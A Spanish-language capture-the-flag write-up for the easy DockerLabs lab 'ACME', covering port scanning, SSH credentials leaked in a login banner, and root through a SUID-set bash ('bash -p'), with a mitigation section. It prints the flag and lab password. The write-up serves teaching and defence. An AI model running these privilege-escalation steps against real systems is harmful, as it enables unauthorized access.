---
layout: writeup
title: "ACME"
platform: dockerlabs
difficulty: facil
date: 2026-10-12
permalink: /writeups/dockerlabs/acme/
ip: 172.17.0.2
os: Linux (Ubuntu 22.04.5 LTS)
tools: [nmap, ssh, suid]
source_url: https://dockerlabs.es/   # cambia esto por el enlace directo a la máquina cuando lo tengas
description: "Máquina fácil de DockerLabs: una web corporativa en mantenimiento filtra en el banner de SSH unas credenciales temporales, y un binario bash con bit SUID mal configurado permite escalar directamente a root."
---

## Resumen

**ACME** es una máquina de dificultad fácil centrada en dos fallos muy típicos en entornos reales: **exposición de información sensible** (credenciales en un mensaje de bienvenida) y una **mala configuración de permisos SUID**. No hay explotación de binarios ni cadenas complejas: todo el recorrido se basa en leer con atención lo que el propio sistema nos enseña.

## Despliegue

Se despliega la máquina con el script correspondiente de DockerLabs:

```bash
sudo bash auto_deploy.sh acme.tar
```

```
Máquina desplegada, su dirección IP es --> 172.17.0.2
```

A partir de aquí, toda la auditoría se realiza contra `172.17.0.2`.

## Enumeración

### Escaneo de puertos

```bash
sudo nmap -p- -sS -sV --min-rate 5000 -n -Pn --open 172.17.0.2
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
```

Dos puertos abiertos: SSH y un servidor web Apache.

### Puerto 80 — web corporativa

Al visitar `http://172.17.0.2` aparece el portal **"ACME Infrastructure Portal"**, marcado como en **modo mantenimiento**. El propio texto de la web da la pista de por dónde seguir:

> El acceso a las consolas de gestión se realiza exclusivamente mediante el servicio SSH. **Pruebe a conectarse por SSH con cualquier usuario** para consultar el aviso y las notificaciones del sistema con las instrucciones de acceso.

Es decir, la propia aplicación indica que el banner de SSH contiene información de acceso. Vamos a comprobarlo.

## Explotación — acceso inicial

Nos conectamos por SSH con un usuario cualquiera, tal y como sugiere el portal:

```bash
ssh usuario@172.17.0.2
```

Antes de pedir la contraseña, el servidor muestra un banner (MOTD) con un aviso interno que **filtra credenciales temporales**:

```
[*] ACME Corporation - Nodo Bastión de Mantenimiento Interno
[!] AVISO DE SEGURIDAD Y ACCESO:
[!] Portal corporativo en proceso de migración a infraestructura interna.
[!] Credenciales temporales asignadas para tareas de mantenimiento:
[!]   - Usuario: usuario
[!]   - Password: P@ssw0rd2026_CTF!
```

Usamos esas credenciales para autenticarnos:

```
usuario@172.17.0.2's password: P@ssw0rd2026_CTF!
```

Y conseguimos una shell válida como `usuario`.

### Flag de usuario

```bash
whoami
# usuario

ls
# user.txt

cat user.txt
```

```
FLAG{nmap_recon_ssh_foothold_7a9f24e1}
```

## Escalada de privilegios

Lo primero, probar si la misma contraseña sirve para `root` (reutilización de credenciales):

```bash
su -
```

```
Password:
su: Authentication failure
```

No cuela. Tocaría enumerar el sistema. Buscamos binarios con el bit **SUID** activo:

```bash
find / -perm -4000 -ls 2>/dev/null
```

Entre el listado de SUID "normales" del sistema (`chfn`, `passwd`, `gpasswd`, `newgrp`, `chsh`, `mount`, `su`, `sudo`...), destaca uno que **no debería estar ahí**:

```
-rwsr-xr-x 1 root root 1396520 ... /usr/bin/bash
```

`/usr/bin/bash` tiene el bit SUID activado. Esto es una mala configuración crítica: al ejecutar bash con la opción `-p` (que conserva privilegios efectivos), obtenemos una shell con el UID efectivo de `root`:

```bash
/usr/bin/bash -p
whoami
```

```
root
```

Confirmamos el compromiso total del sistema:

```bash
hostname -I; whoami; id
```

```
172.17.0.2
root
uid=1000(usuario) gid=1000(usuario) euid=0(root) groups=1000(usuario)
```

`euid=0(root)` confirma que, aunque seguimos siendo el usuario 1000 a nivel real, el **UID efectivo es root**: control total de la máquina.

## Resumen de la cadena de ataque

1. **Recon web** → el portal en mantenimiento indica probar login SSH con cualquier usuario.
2. **Fuga de información** → el banner de SSH expone un usuario y contraseña temporales.
3. **Acceso inicial** → login SSH con esas credenciales → flag de usuario.
4. **Escalada** → `find / -perm -4000` revela `/usr/bin/bash` con SUID → `bash -p` → root.

## Mitigación

- No incluir credenciales, avisos internos ni datos de acceso en banners o MOTD de SSH (`/etc/motd`, `PrintMotd`, `Banner` en `sshd_config`).
- Revisar periódicamente los binarios con bit SUID (`find / -perm -4000`) y eliminar el bit de cualquiera que no lo necesite explícitamente — **nunca** debería estar en `bash`, `sh`, `python`, etc.
- Aplicar el principio de mínimo privilegio y rotar credenciales temporales en vez de dejarlas fijas en texto plano.

## Flag

```
FLAG{nmap_recon_ssh_foothold_7a9f24e1}
```
